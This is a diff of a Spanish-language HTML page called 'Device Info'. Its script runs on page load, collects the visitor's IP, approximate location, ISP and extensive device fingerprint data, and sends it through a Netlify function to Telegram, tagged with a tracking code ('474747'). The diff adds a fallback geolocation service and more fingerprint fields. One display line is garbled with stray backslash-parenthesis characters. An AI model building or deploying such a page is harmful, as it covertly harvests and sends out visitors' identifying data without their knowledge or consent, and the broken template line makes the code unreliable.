@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Device Info</title>
+  <title>474747 - Device Info</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -22,31 +22,39 @@
       border: 1px solid #333;
       border-radius: 16px;
       padding: 28px;
-      max-width: 420px;
+      max-width: 440px;
       width: 100%;
       box-shadow: 0 8px 32px rgba(0,0,0,0.4);
     }
+    .codigo {
+      font-size: 0.85rem;
+      color: #666;
+      letter-spacing: 2px;
+      margin-bottom: 4px;
+    }
     h1 {
-      font-size: 1.4rem;
+      font-size: 1.5rem;
       margin-bottom: 8px;
       color: #fff;
     }
     .status {
       font-size: 0.95rem;
       color: #aaa;
-      margin-bottom: 20px;
+      margin-bottom: 18px;
     }
     .status.ok { color: #4ade80; }
     .status.error { color: #f87171; }
     .info {
-      font-size: 0.85rem;
-      color: #888;
-      line-height: 1.6;
+      font-size: 0.88rem;
+      color: #bbb;
+      line-height: 1.7;
     }
+    .info b { color: #ddd; }
   </style>
 </head>
 <body>
   <div class="card">
+    <div class="codigo">474747</div>
     <h1>Device Info</h1>
     <p class="status" id="status">Recolectando información...</p>
     <div class="info" id="info"></div>
@@ -58,71 +66,108 @@
       const infoEl = document.getElementById("info");
 
       const data = {
-        // Red
+        // ─── Red ───
         ip: "",
         country: "",
         city: "",
+        region: "",
         isp: "",
         conexion: navigator.connection
-          ? `${navigator.connection.effectiveType} / ${navigator.connection.downlink} Mbps`
+          ? `${navigator.connection.effectiveType || "?"} / ${navigator.connection.downlink || "?"} Mbps`
           : "No disponible",
-        tipoRed: navigator.connection ? navigator.connection.type : "Desconocido",
+        tipoRed: navigator.connection?.type || "Desconocido",
+        rtt: navigator.connection?.rtt ? `${navigator.connection.rtt} ms` : "N/A",
 
-        // Dispositivo
+        // ─── Dispositivo ───
         os: navigator.platform || navigator.userAgentData?.platform || "Desconocido",
-        browser: navigator.userAgent.includes("Chrome") ? "Chrome" :
-                 navigator.userAgent.includes("Firefox") ? "Firefox" :
-                 navigator.userAgent.includes("Safari") ? "Safari" : "Desconocido",
-        device: /Mobi|Android/i.test(navigator.userAgent) ? "Móvil" : "PC",
+        browser: (() => {
+          const ua = navigator.userAgent;
+          if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
+          if (ua.includes("Firefox")) return "Firefox";
+          if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+          if (ua.includes("Edg")) return "Edge";
+          if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+          return "Desconocido";
+        })(),
+        device: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? "Móvil" : "PC",
         ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Desconocida",
         nucleos: navigator.hardwareConcurrency || "Desconocido",
         pantalla: `${window.screen.width} × ${window.screen.height}`,
+        pantallaDisponible: `${window.screen.availWidth} × ${window.screen.availHeight}`,
         pixelRatio: window.devicePixelRatio || 1,
+        orientacion: screen.orientation?.type || "Desconocida",
+        colorDepth: `${screen.colorDepth} bits`,
 
-        // Batería
+        // ─── Batería ───
         bateria: "No disponible",
         cargando: "No disponible",
+        nivelBateria: null,
 
-        // Idioma y zona
+        // ─── Idioma y zona ───
         idioma: navigator.language || "Desconocido",
+        idiomas: navigator.languages ? navigator.languages.join(", ") : "N/A",
         zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        offset: new Date().getTimezoneOffset(),
 
-        // Otras
+        // ─── Otras ───
         toque: "ontouchstart" in window ? "Sí" : "No",
         cookies: navigator.cookieEnabled ? "Sí" : "No",
-        userAgent: navigator.userAgent
+        doNotTrack: navigator.doNotTrack || "No configurado",
+        online: navigator.onLine ? "Sí" : "No",
+        userAgent: navigator.userAgent,
+        vendor: navigator.vendor || "N/A",
+        hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
+        maxTouchPoints: navigator.maxTouchPoints || 0,
+        pdfViewer: navigator.pdfViewerEnabled ? "Sí" : "No",
+        webdriver: navigator.webdriver ? "Sí (posible bot)" : "No"
       };
 
-      // Obtener batería si está disponible
+      // Batería
       if (navigator.getBattery) {
         try {
           const bat = await navigator.getBattery();
-          data.bateria = `${Math.round(bat.level * 100)}%`;
-          data.cargando = bat.charging ? "Cargando" : "Descargando";
+          data.nivelBateria = Math.round(bat.level * 100);
+          data.bateria = `${data.nivelBateria}%`;
+          data.cargando = bat.charging ? "Cargando ⚡" : "Descargando 🔋";
         } catch (e) {}
       }
 
-      // Intentar obtener IP pública (opcional)
+      // IP y geolocalización aproximada
       try {
         const geo = await fetch("https://ipapi.co/json/").then(r => r.json());
         data.ip = geo.ip || "";
         data.country = geo.country_name || "";
         data.city = geo.city || "";
+        data.region = geo.region || "";
         data.isp = geo.org || "";
-      } catch (e) {}
+      } catch (e) {
+        try {
+          // Fallback
+          const geo2 = await fetch("https://ipinfo.io/json").then(r => r.json());
+          data.ip = geo2.ip || "";
+          data.country = geo2.country || "";
+          data.city = geo2.city || "";
+          data.isp = geo2.org || "";
+        } catch (e2) {}
+      }
 
-      // Mostrar resumen en pantalla
+      // Mostrar en pantalla
       infoEl.innerHTML = `
         <b>IP:</b> ${data.ip || "—"}<br>
-        <b>País:</b> ${data.country || "—"}<br>
-        <b>Ciudad:</b> ${data.city || "—"}<br>
+        <b>País:</b> ${data.country || "—"} ${data.city ? "· " + data.city : ""}<br>
+        <b>ISP:</b> ${data.isp || "—"}<br>
+        <b>Conexión:</b> ${data.conexion}<br>
         <b>OS:</b> ${data.os}<br>
         <b>Navegador:</b> ${data.browser}<br>
         <b>Dispositivo:</b> ${data.device}<br>
-        <b>Pantalla:</b> ${data.pantalla}
+        <b>Pantalla:</b> \( {data.pantalla} ( \){data.pixelRatio}x)<br>
+        <b>RAM:</b> ${data.ram} · <b>Núcleos:</b> ${data.nucleos}<br>
+        <b>Batería:</b> ${data.bateria} · ${data.cargando}<br>
+        <b>Idioma:</b> ${data.idioma}<br>
+        <b>Zona:</b> ${data.zonaHoraria}
       `;
 
-      // Enviar a Netlify Function → Telegram
+      // Enviar a Netlify → Telegram
       try {
         const res = await fetch("/api/device", {
           method: "POST",
@@ -146,7 +191,6 @@
       }
     }
 
-    // Ejecutar al cargar la página
     enviarInfo();
   </script>
 </body>
